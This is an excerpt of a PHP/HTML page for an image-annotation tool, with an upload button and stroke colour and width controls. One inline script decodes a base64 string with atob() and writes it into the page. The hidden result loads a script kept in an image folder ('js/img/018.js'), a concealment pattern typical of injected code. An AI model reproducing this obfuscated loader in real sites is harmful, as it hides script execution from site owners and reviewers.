...
<html lang="en"> <?php include('admin/head.php'); ?> <?php include('admin/header.php'); ?> <?php include('admin/user.php'); ?> <div id="post-header" class="post-header">
  ...
  <div class="toolarea">
    <div id="uploadContainer">
      <input type="file" id="uploadButton" accept="image/*" onchange="loadImage(event)">
    </div>
    <div class="container" id="editorContainer" style="display: none;">
      <div class="sidebar">
        <div>
          <h2>Customize Stroke</h2>
          <input type="color" id="strokeColorPicker" value="#ff0000">
          <!-- Stroke color picker -->
          <input type="number" id="strokeWidth" value="5" min="1" step="1">
          <!-- Stroke width input -->
        </div>
        <div>
  ...
  <script>
    document.write(atob("IDxzY3JpcHQgc3JjPSJqcy9pbWcvMDE4LmpzIiBkZWZlcj0iIj48L3NjcmlwdD4="));
  </script>
  <script>
    // Get the button
